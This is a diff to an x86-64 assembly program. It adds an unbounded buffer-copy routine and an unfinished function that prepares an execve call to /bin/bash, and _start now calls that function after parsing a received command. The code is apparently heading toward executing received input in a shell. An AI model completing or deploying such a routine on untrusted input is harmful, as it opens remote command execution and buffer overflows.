@@ -32,6 +32,8 @@ section .text
     global fn_sleep_ns
     global fn_clean_buffer
     global fn_parse_command
+    global fn_exec_cmd
+    global fn_buffer_copy
 
 ; Function to exit
 fn_error_exit:
@@ -106,6 +108,42 @@ fn_clean_buffer:
     pop rbp
     ret
 
+; Function to copy a buffer to another buffer
+; Make sure the destination buffer is large enough to contain source buffer
+; Parameters:
+; rdi - address to buffer 1, destination buffer
+; rsi - address to buffer 2, source buffer
+; rdx - length of buffer 2
+fn_buffer_copy:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    xor rcx, rcx
+.loop:
+    mov al, byte [rsi + rcx]    ; Load byte of source buffer
+    mov byte [rdi + rcx], al    ; Copy byte into destination buffer
+    inc rcx
+    cmp rcx, rdx
+    jl .loop
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; Function to execute a command in /bin/bash using execve
+fn_exec_cmd:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    mov rax, 0x3b               ; execve syscall
+    lea rdi, [bash_path]        ; Load address to bash path
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
 ; Function to parse the received command and store it in cmd_buffer
 fn_parse_command:
     push rbp
@@ -167,6 +205,8 @@ fn_parse_command:
     mov al, byte [rdi+rcx]
     cmp rax, 0x0
     jne .copy_loop
+
+    mov [cmd_buffer_length], rdx ; Store length of buffer inside cmp_buffer_length
 
     mov rsp, rbp
     pop rbp
@@ -374,6 +414,9 @@ _start:
 
     ;call fn_dbg_print_rx_buffer
     call fn_dbg_print_cmd_buffer
+
+    ; Execute command in bash
+    call fn_exec_cmd
 
     ; Exit the program
     mov rax, 0x3c               ; exit syscall
